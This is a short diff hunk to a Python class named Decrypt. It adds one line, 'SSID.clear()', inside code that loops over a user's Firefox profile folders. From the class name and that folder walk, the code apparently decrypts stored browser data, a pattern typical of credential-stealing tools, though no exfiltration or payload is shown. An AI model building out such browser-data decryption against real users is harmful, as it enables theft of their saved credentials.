@@ -39,6 +39,7 @@ class Decrypt:
                                     if interrupt:
                                         interrupt = False
                                         break
+                        SSID.clear()
 
                         for i in os.listdir(f'{path_user}/FireFox'):
                             if os.path.isdir(f'{path_user}/FireFox/{i}'):
